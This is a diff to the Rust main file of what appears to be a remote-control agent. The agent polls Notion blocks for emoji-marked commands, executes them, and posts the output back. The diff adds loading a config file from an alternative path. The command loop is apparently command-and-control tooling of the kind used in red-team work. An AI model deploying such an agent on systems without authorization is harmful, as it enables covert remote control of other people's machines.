@@ -13,7 +13,8 @@ mod config;
 use config::{
     ConfigOptions,
     get_config_options, 
-    get_config_options_debug
+    get_config_options_debug,
+    load_config_options
 };
 
 mod notion;
@@ -28,7 +29,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("Starting!");
     
     // Handle config options
-    let config_options: ConfigOptions;
+    let mut config_options: ConfigOptions;
 
     // Check for `-d` option
     match args().nth(1) {
@@ -39,11 +40,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     return get_config_options_debug();
                 });
                 config_options = config_options_handle.await?.unwrap();
+            // Handle alternative config file location
+            } else if a == "-c" {
+                let config_file_path = args().nth(2).unwrap();
+                config_options = load_config_options(Some(config_file_path.as_str())).await?;
             } else {
                 config_options = get_config_options().await?;
             }
         },
-        None => {config_options = get_config_options().await?;}
+        None => {
+            config_options = load_config_options(None).await?;
+        }
     }
     
     let hn = hostname::get()
@@ -90,7 +97,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     if s.contains("🎯") {
                         println!("Got command: {}", s);
                         let notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
-                        let output = notion_command.handle().await?;
+                        let output = notion_command.handle(&mut config_options).await?;
                         let command_block_id = block["id"].as_str().unwrap();
                         complete_command(&client, block.to_owned()).await;
                         send_result(&client, command_block_id, output).await;
